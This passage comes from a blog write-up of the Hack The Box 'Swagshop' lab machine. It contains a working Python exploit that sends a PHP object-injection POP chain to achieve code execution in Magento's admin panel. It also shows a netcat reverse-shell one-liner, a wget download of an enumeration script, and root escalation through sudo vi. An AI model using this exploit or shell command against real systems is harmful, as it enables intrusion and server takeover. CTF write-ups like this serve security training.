<span class="n">php_function</span> <span class="o">=</span> <span class="s">'system'</span>  <span class="c1"># Note: we can only pass 1 argument to the function
</span><span class="n">install_date</span> <span class="o">=</span> <span class="s">'Wed, 08 May 2019 07:23:09 +0000'</span>  <span class="c1"># This needs to be the exact date from /app/etc/local.xml
</span>
<span class="c1"># POP chain to pivot into call_user_exec
</span><span class="n">payload</span> <span class="o">=</span> <span class="s">'O:8:</span><span class="se">\"</span><span class="s">Zend_Log</span><span class="se">\"</span><span class="s">:1:{s:11:</span><span class="se">\"\00</span><span class="s">*</span><span class="se">\00</span><span class="s">_writers</span><span class="se">\"</span><span class="s">;a:2:{i:0;O:20:</span><span class="se">\"</span><span class="s">Zend_Log_Writer_Mail</span><span class="se">\"</span><span class="s">:4:{s:16:'</span> \
          <span class="s">'</span><span class="se">\"\00</span><span class="s">*</span><span class="se">\00</span><span class="s">_eventsToMail</span><span class="se">\"</span><span class="s">;a:3:{i:0;s:11:</span><span class="se">\"</span><span class="s">EXTERMINATE</span><span class="se">\"</span><span class="s">;i:1;s:12:</span><span class="se">\"</span><span class="s">EXTERMINATE!</span><span class="se">\"</span><span class="s">;i:2;s:15:</span><span class="se">\"</span><span class="s">'</span> \
          <span class="s">'EXTERMINATE!!!!</span><span class="se">\"</span><span class="s">;}s:22:</span><span class="se">\"\00</span><span class="s">*</span><span class="se">\00</span><span class="s">_subjectPrependText</span><span class="se">\"</span><span class="s">;N;s:10:</span><span class="se">\"\00</span><span class="s">*</span><span class="se">\00</span><span class="s">_layout</span><span class="se">\"</span><span class="s">;O:23:</span><span class="se">\"</span><span class="s">'</span>     \
          <span class="s">'Zend_Config_Writer_Yaml</span><span class="se">\"</span><span class="s">:3:{s:15:</span><span class="se">\"\00</span><span class="s">*</span><span class="se">\00</span><span class="s">_yamlEncoder</span><span class="se">\"</span><span class="s">;s:%d:</span><span class="se">\"</span><span class="s">%s</span><span class="se">\"</span><span class="s">;s:17:</span><span class="se">\"\00</span><span class="s">*</span><span class="se">\00</span><span class="s">'</span>     \
          <span class="s">'_loadedSection</span><span class="se">\"</span><span class="s">;N;s:10:</span><span class="se">\"\00</span><span class="s">*</span><span class="se">\00</span><span class="s">_config</span><span class="se">\"</span><span class="s">;O:13:</span><span class="se">\"</span><span class="s">Varien_Object</span><span class="se">\"</span><span class="s">:1:{s:8:</span><span class="se">\"\00</span><span class="s">*</span><span class="se">\00</span><span class="s">_data</span><span class="se">\"</span><span class="s">'</span> \
          <span class="s">';s:%d:</span><span class="se">\"</span><span class="s">%s</span><span class="se">\"</span><span class="s">;}}s:8:</span><span class="se">\"\00</span><span class="s">*</span><span class="se">\00</span><span class="s">_mail</span><span class="se">\"</span><span class="s">;O:9:</span><span class="se">\"</span><span class="s">Zend_Mail</span><span class="se">\"</span><span class="s">:0:{}}i:1;i:2;}}'</span> <span class="o">%</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">php_function</span><span class="p">),</span> <span class="n">php_function</span><span class="p">,</span>
                                                                                     <span class="nb">len</span><span class="p">(</span><span class="n">arg</span><span class="p">),</span> <span class="n">arg</span><span class="p">)</span>
<span class="c1"># Setup the mechanize browser and options
</span><span class="n">br</span> <span class="o">=</span> <span class="n">mechanize</span><span class="p">.</span><span class="n">Browser</span><span class="p">()</span>
<span class="c1">#br.set_proxies({"http": "localhost:8080"})
</span><span class="n">br</span><span class="p">.</span><span class="n">set_handle_robots</span><span class="p">(</span><span class="bp">False</span><span class="p">)</span>

<span class="n">request</span> <span class="o">=</span> <span class="n">br</span><span class="p">.</span><span class="nb">open</span><span class="p">(</span><span class="n">target</span><span class="p">)</span>

<span class="n">br</span><span class="p">.</span><span class="n">select_form</span><span class="p">(</span><span class="n">nr</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
<span class="n">br</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="n">new_control</span><span class="p">(</span><span class="s">'text'</span><span class="p">,</span> <span class="s">'login[username]'</span><span class="p">,</span> <span class="p">{</span><span class="s">'value'</span><span class="p">:</span> <span class="n">username</span><span class="p">})</span>  <span class="c1"># Had to manually add username control.
</span><span class="n">br</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="n">fixup</span><span class="p">()</span>
<span class="n">br</span><span class="p">[</span><span class="s">'login[username]'</span><span class="p">]</span> <span class="o">=</span> <span class="n">username</span>
<span class="n">br</span><span class="p">[</span><span class="s">'login[password]'</span><span class="p">]</span> <span class="o">=</span> <span class="n">password</span>

<span class="n">br</span><span class="p">.</span><span class="n">method</span> <span class="o">=</span> <span class="s">"POST"</span>
<span class="n">request</span> <span class="o">=</span> <span class="n">br</span><span class="p">.</span><span class="n">submit</span><span class="p">()</span>
<span class="n">content</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>

<span class="n">url</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="s">"ajaxBlockUrl = </span><span class="se">\'</span><span class="s">(.*)</span><span class="se">\'</span><span class="s">"</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>
<span class="n">url</span> <span class="o">=</span> <span class="n">url</span><span class="p">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">key</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="s">"var FORM_KEY = '(.*)'"</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>
<span class="n">key</span> <span class="o">=</span> <span class="n">key</span><span class="p">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="n">request</span> <span class="o">=</span> <span class="n">br</span><span class="p">.</span><span class="nb">open</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s">'block/tab_orders/period/7d/?isAjax=true'</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="s">'isAjax=false&amp;form_key='</span> <span class="o">+</span> <span class="n">key</span><span class="p">)</span>
<span class="n">tunnel</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="s">"src=</span><span class="se">\"</span><span class="s">(.*)\?ga="</span><span class="p">,</span> <span class="n">request</span><span class="p">.</span><span class="n">read</span><span class="p">())</span>
<span class="n">tunnel</span> <span class="o">=</span> <span class="n">tunnel</span><span class="p">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">gh</span> <span class="o">=</span> <span class="n">md5</span><span class="p">(</span><span class="n">payload</span> <span class="o">+</span> <span class="n">install_date</span><span class="p">).</span><span class="n">hexdigest</span><span class="p">()</span>

<span class="n">exploit</span> <span class="o">=</span> <span class="n">tunnel</span> <span class="o">+</span> <span class="s">'?ga='</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="s">'&amp;h='</span> <span class="o">+</span> <span class="n">gh</span>

<span class="k">try</span><span class="p">:</span>
    <span class="n">request</span> <span class="o">=</span> <span class="n">br</span><span class="p">.</span><span class="nb">open</span><span class="p">(</span><span class="n">exploit</span><span class="p">)</span>
<span class="k">except</span> <span class="p">(</span><span class="n">mechanize</span><span class="p">.</span><span class="n">HTTPError</span><span class="p">,</span> <span class="n">mechanize</span><span class="p">.</span><span class="n">URLError</span><span class="p">)</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
    <span class="k">print</span> <span class="n">e</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
</pre></table></code></div></div><p>For the <code class="language-plaintext highlighter-rouge">install_date</code> variable, it can be found in <code class="language-plaintext highlighter-rouge">http://swagshop.htb/app/etc/local.xml</code>. Now lets test it out with a <code class="language-plaintext highlighter-rouge">whoami</code> command. For the <code class="language-plaintext highlighter-rouge">target</code> variable, which is the first argument, it is the URL of the admin login page (<code class="language-plaintext highlighter-rouge">http://10.10.10.140.htb/index.php/admin</code>). Note that we cannot use the domain name <code class="language-plaintext highlighter-rouge">swagshop.htb</code> as we will always be redirected to <code class="language-plaintext highlighter-rouge">10.10.10.140</code> for some reason.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$ </span>python poc.py http://10.10.10.140/index.php/admin <span class="s2">"whoami"</span>
www-data
</pre></table></code></div></div><p>Great! Now lets our listener and establish a reverse shell connection!</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$ </span>nc <span class="nt">-lvnp</span> 1337
listening on <span class="o">[</span>any] 1337 ...
</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>python poc.py http://10.10.10.140/index.php/admin <span class="s2">"rm /tmp/g;mkfifo /tmp/g;cat /tmp/g|/bin/sh -i 2&gt;&amp;1|nc 10.10.XXX.XXX 1337 &gt;/tmp/g"</span>
</pre></table></code></div></div><p>As expected, we caught the reverse shell.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>connect to <span class="o">[</span>10.10.XXX.XXX] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.140] 39904
/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
$ whoami
www-data
</span></pre></table></code></div></div><h1 id="enumeration">Enumeration</h1><p>To quickly enumerate for possible privilege escalation vectors, I will using <a href="https://github.com/rebootuser/LinEnum">LinEnum</a>. To transfer it from my machine to this machine, I will be using <code class="language-plaintext highlighter-rouge">python</code>’s <code class="language-plaintext highlighter-rouge">SimpleHTTPServer</code> module.</p><p>On my machine:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">mkdir </span>httpserver
<span class="nv">$ </span><span class="nb">cd </span>httpserver
<span class="nv">$ </span><span class="nb">cp</span> ~/Downloads/LinEnum.sh <span class="nb">.</span>
<span class="nv">$ </span>python <span class="nt">-m</span> SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
</pre></table></code></div></div><p>On the <code class="language-plaintext highlighter-rouge">Swagshop</code> machine:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="nv">$ </span>wget http://10.10.14.140/LinEnum.sh
<span class="nt">--2019-09-07</span> 05:03:29--  http://10.10.14.140/LinEnum.sh
Connecting to 10.10.14.140:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 45651 <span class="o">(</span>45K<span class="o">)</span> <span class="o">[</span>text/x-sh]
Saving to: <span class="s1">'LinEnum.sh'</span>

     0K .......... .......... .......... .......... ....      100% 82.5K<span class="o">=</span>0.5s

2019-09-07 05:03:31 <span class="o">(</span>82.5 KB/s<span class="o">)</span> - <span class="s1">'LinEnum.sh'</span> saved <span class="o">[</span>45651/45651]
<span class="nv">$ </span><span class="nb">chmod </span>777 LinEnum.sh
<span class="nv">$ </span>./LinEnum.sh
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">LinEnum.sh</code> revealed that <code class="language-plaintext highlighter-rouge">www-data</code> had sudo privileges.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>User www-data may run the following commands on swagshop:
    (root) NOPASSWD: /usr/bin/vi /var/www/html/*


[+] Possible sudo pwnage!
/usr/bin/vi
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">www-data</code> is only able to execute <code class="language-plaintext highlighter-rouge">/usr/bin/vi</code> on a file in <code class="language-plaintext highlighter-rouge">/var/www/html/</code> as <code class="language-plaintext highlighter-rouge">root</code>. To read the root flag, there are actually 2 ways to go about doing this.</p><h1 id="roottxt-1">root.txt (1)</h1><p><code class="language-plaintext highlighter-rouge">vi</code> actually has the ability to open a shell inside it by entering <code class="language-plaintext highlighter-rouge">:!bash</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">sudo</span> /usr/bin/vi /var/www/html/a
~
:!bash
<span class="nb">whoami
</span>root
<span class="nb">cat</span> /root/root.txt
c2b0XXXXXXXXXXXXXXXXXXXXXXXXXXXX

   ___ ___
 /| |/|<span class="se">\|</span> |<span class="se">\ </span>
/_| ´ |.<span class="sb">`</span> |_<span class="se">\ </span>          We are open! <span class="o">(</span>Almost<span class="o">)</span>
  |   |.  |
  |   |.  |         Join the beta HTB Swag Store!
  |___|.__|       https://hackthebox.store/password

                   PS: Use root flag as password!
</pre></table></code></div></div><h1 id="roottxt-2">root.txt (2)</h1><p>If we create a symbolic link in <code class="language-plaintext highlighter-rouge">/var/www/html</code> that references the root flag, we will be able to trick <code class="language-plaintext highlighter-rouge">sudo</code> into thinking we are simply opening a file in <code class="language-plaintext highlighter-rouge">/var/www/html/</code> with <code class="language-plaintext highlighter-rouge">vi</code>!</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">ln</span> <span class="nt">-s</span> /root/root.txt /var/www/html/root.txt
<span class="nv">$ </span><span class="nb">sudo </span>vi /var/www/html/root.txt
c2b0XXXXXXXXXXXXXXXXXXXXXXXXXXXX

   ___ ___
 /| |/|<span class="se">\|</span> |<span class="se">\ </span>
/_| ´ |.<span class="sb">`</span> |_<span class="se">\ </span>          We are open! <span class="o">(</span>Almost<span class="o">)</span>
  |   |.  |
  |   |.  |         Join the beta HTB Swag Store!
  |___|.__|       https://hackthebox.store/password

                   PS: Use root flag as password!
</pre></table></code></div></div><h3 id="rooted--thank-you-for-reading-and-look-forward-for-more-writeups-and-articles-">Rooted ! Thank you for reading and look forward for more writeups and articles !</h3></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>hackthebox</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/magento/" class="post-tag no-text-decoration" >magento</a> <a href="/tags/linux/" class="post-tag no-text-decoration" >linux</a> <a href="/tags/vi/" class="post-tag no-text-decoration" >vi</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hack The Box - Swagshop - rizemon's blog&url=https://rizemon.github.io/posts/swagshop-htb/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hack The Box - Swagshop - rizemon's blog&u=https://rizemon.github.io/posts/swagshop-htb/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Hack The Box - Swagshop - rizemon's blog&url=https://rizemon.github.io/posts/swagshop-htb/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/htbcybersanta-ctf/">HackTheBox CTF - Cyber Santa</a><li><a href="/posts/ticket1part2-thm/">TryHackMe - Pre Security Learning Path (Part 2) [PARTICIPATE IN THE GIVEAWAY!]</a><li><a href="/posts/oscp-reflection/">Post-OSCP Writeup</a><li><a href="/posts/granny-htb/">Hack The Box - Granny (Without Metasploit)</a><li><a href="/posts/cronos-htb/">Hack The Box - Cronos (Without Metasploit)</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/php/">php</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/juicypotato/">juicypotato</a> <a class="post-tag" href="/tags/rsa/">rsa</a> <a class="post-tag" href="/tags/smb/">smb</a> <a class="post-tag" href="/tags/sudo/">sudo</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/dsonus2021-insecure-ctf/"><div class="card-body"> <span class="timeago small" > Aug 2, 2021 <i class="unloaded">2021-08-02T17:19:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>DSO NUS CTF - Insecure</h3><div class="text-muted small"><p> Description Someone once told me that SUID is a bad idea. Could you show me why? This challenge server can be accessed here: (Any one of the options below is fine) (Suggested access via ‘...</p></div></div></a></div><div class="card"> <a href="/posts/delivery-htb/"><div class="card-body"> <span class="timeago small" > May 23, 2021 <i class="unloaded">2021-05-23T03:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Delivery</h3><div class="text-muted small"><p> Configuration The operating system that I will be using to tackle this machine is a Kali Linux VM. What I learnt from other writeups is that it was a good habit to map a domain name to the mach...</p></div></div></a></div><div class="card"> <a href="/posts/writeup-htb/"><div class="card-body"> <span class="timeago small" > Oct 13, 2019 <i class="unloaded">2019-10-13T15:35:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Writeup</h3><div class="text-muted small"><p> Configuration The operating system that I will be using to tackle this machine is a Kali Linux VM. Always remember to map a domain name to the machine’s IP address to ease your rooting ! 1 $ e...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/bastion-htb/" class="btn btn-outline-primary"><p>Hack The Box - Bastion</p></a> <a href="/posts/writeup-htb/" class="btn btn-outline-primary"><p>Hack The Box - Writeup</p></a></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/rizemon">rizemon</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy/" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/php/">php</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/juicypotato/">juicypotato</a> <a class="post-tag" href="/tags/rsa/">rsa</a> <a class="post-tag" href="/tags/smb/">smb</a> <a class="post-tag" href="/tags/sudo/">sudo</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://rizemon.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
